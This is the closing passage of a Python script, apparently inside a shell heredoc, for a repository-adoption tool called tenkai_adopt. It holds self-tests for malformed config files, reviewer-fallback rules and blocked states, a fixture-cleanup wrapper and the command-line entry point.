    check("a top-level array is ROUTED to nen schema check, never a traceback", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
    gates.write_text("{not json")
    check("unparseable gates.json is ROUTED to nen schema check", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
    gates.write_bytes(b"\xff\xfe{")
    check("a non-UTF-8 gates.json is ROUTED, never a traceback", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
    gates.unlink(); gates.symlink_to(Path(tempfile.gettempdir()))
    check("a symlinked gates.json is DRIFT, never read through", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
    gates.unlink(); gates.write_text("[]")
    full = run("diagnose", ctx_for(dx))
    check("a diagnose over a wrongly shaped gates.json still reports every item", any(r["id"] == "gates/check-exclusions" for r in full["items"]) and len(full["items"]) > 5)
    gates.unlink(); gates.write_text(json.dumps({"check_exclusions": []}))
    (dx / "nen" / "workflow.json").write_text(json.dumps({"reports": {"timeZone": "America/Bogota"}}))
    r = ex([row()])
    check("the declared reports.timeZone is the clock, and is named", "America/Bogota" in r["detail"])

    print("\nreviewer fallback -- identities in the chain, the terminal, a live exhaustion (ruling 2026-09-29)")
    dr = fixture()
    (dr / "nen").mkdir(parents=True, exist_ok=True)
    gr = dr / "nen" / "gates.json"

    def fb(block, reviewers=("copilot",)):
        gr.write_text(json.dumps({"reviewers": [{"name": n} for n in reviewers], "reviewer_fallback": block}))
        return ReviewerFallback().detect(ctx_for(dr))
    gr.write_text(json.dumps({"reviewers": [{"name": "copilot"}]}))
    check("no reviewer_fallback is satisfied", ReviewerFallback().detect(ctx_for(dr))["state"] == SATISFIED)
    ok_row = {"reviewer": "copilot", "reason": "credits", "ruled": _today, "until": "condition: the credits are restored"}
    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [ok_row]})
    check("a live exhaustion with every chain step declared is satisfied", r["state"] == SATISFIED and "copilot" in r["detail"])
    r = fb({"chain": ["copilot", "cursor"], "terminal": "hanten", "exhausted": [ok_row]})
    check("a chain step with no identity is ROUTED, named, never DRIFT", r["state"] == ROUTED and "cursor" in r["detail"])
    r = fb({"chain": ["copilot", "hanten"], "terminal": "hanten", "exhausted": []})
    check("the terminal inside the chain is DRIFT", r["state"] == DRIFT)
    r = fb({"chain": ["copilot"], "terminal": "copilot", "exhausted": []})
    check("a terminal that is not hanten is DRIFT", r["state"] == DRIFT)
    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [dict(ok_row, ruled=_old)]})
    check("a condition exhaustion older than 90 days is DRIFT, lapsed", r["state"] == DRIFT and "lapsed" in r["detail"])
    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [dict(ok_row, until="2026-9-1")]})
    check("a near-miss date in an exhaustion is DRIFT, never a condition", r["state"] == DRIFT and "neither" in r["detail"])
    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [dict(ok_row, reviewer="bugbot")]})
    check("an exhausted reviewer not in the chain is DRIFT", r["state"] == DRIFT and "not in the chain" in r["detail"])
    r = fb({"chain": [], "terminal": "hanten", "exhausted": []})
    check("an empty chain is DRIFT", r["state"] == DRIFT)
    gr.write_text(json.dumps({"reviewers": [{"name": "copilot"}], "reviewer_fallback": "x"}))
    check("a non-object reviewer_fallback is DRIFT", ReviewerFallback().detect(ctx_for(dr))["state"] == DRIFT)

    print("\nblocked states are reported, never repaired around")
    d5 = fixture()
    (d5 / "nen").mkdir(parents=True, exist_ok=True)
    (d5 / "nen" / "contract.json").write_text("{not json")
    row = NenDeclaration("nen/contract.json", "x").detect(ctx_for(d5))
    check("malformed JSON is BLOCKED, not silently rewritten", row["state"] == BLOCKED)

    print()
    if failures:
        print(f"tenkai_adopt --self-test: {len(failures)} FAILED: {', '.join(failures)}")
        return 1
    print(f"tenkai_adopt --self-test: all green ({checks_run} assertions)")
    return 0


# --------------------------------------------------------------------------
def _self_test_guarded() -> int:
    """Every fixture is removed on EVERY path, including a failing assertion.

    The old loop removed five named directories after the last check, so any
    exception -- or a `return` from a failure -- leaked them into /tmp.
    """
    made: list = []
    try:
        return self_test()
    finally:
        for d in _FIXTURES:
            shutil.rmtree(d, ignore_errors=True)
        _FIXTURES.clear()


def main(argv):
    if not argv:
        usage("a subcommand is required: diagnose | apply | runner-policy | --self-test")
    cmd, rest = argv[0], argv[1:]
    if cmd == "--self-test":
        raise SystemExit(_self_test_guarded())

    opts = {}
    i = 0
    while i < len(rest):
        a = rest[i]
        if a == "--json":
            opts["json"] = True
            i += 1
            continue
        if not a.startswith("--") or i + 1 >= len(rest):
            usage(f"unexpected argument {a!r}")
        opts[a[2:]] = rest[i + 1]
        i += 2

    as_json = bool(opts.pop("json", False))
    vis = opts.get("visibility")
    sh = opts.get("self-hosted")
    sh = int(sh) if sh is not None else None

    if cmd == "runner-policy":
        if vis is None or sh is None:
            usage("runner-policy needs --visibility <public|private> and --self-hosted <n>")
        r = derive_runner(vis, sh)
        if as_json:
            print(json.dumps(r, indent=2))
        else:
            print(f"runs-on:  {r['runs_on']}")
            print(f"fallback: {r['fallback']}")
            print(f"because:  {r['reason']}")
        raise SystemExit(0)

    if cmd not in ("diagnose", "apply"):
        usage(f"unknown subcommand {cmd!r}")
    if "repo" not in opts:
        usage(f"{cmd} needs --repo <path>")
    repo = Path(opts["repo"]).resolve()
    if not repo.is_dir():
        usage(f"no such directory: {repo}")
    hatsu_root = Path(opts.get("hatsu-root", os.environ["TENKAI_DEFAULT_ROOT"])).resolve()

    ctx = Ctx(repo, hatsu_root, opts.get("slug"), vis, sh, probe=True,
              runner_labels=opts.get("runner-labels"))
    res = run(cmd, ctx)
    report(res, as_json)
    raise SystemExit(1 if res["outstanding"] else 0)


main(sys.argv[1:])
PY
